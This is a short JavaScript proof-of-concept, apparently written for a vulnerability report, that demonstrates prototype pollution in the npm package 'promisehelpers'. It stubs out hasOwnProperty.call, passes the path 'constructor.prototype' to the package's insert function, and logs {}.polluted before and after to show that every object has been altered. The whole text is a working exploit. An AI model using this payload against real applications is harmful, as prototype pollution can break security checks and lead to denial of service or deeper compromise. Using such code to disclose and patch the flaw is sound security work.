Object.prototype.hasOwnProperty.call = () => true;
const promisehelpers = require('promisehelpers');
obj = {};
console.log({}.polluted);
promisehelpers.insert([
    'constructor.prototype',
    'polluted'
], 'yes')(obj);
console.log({}.polluted);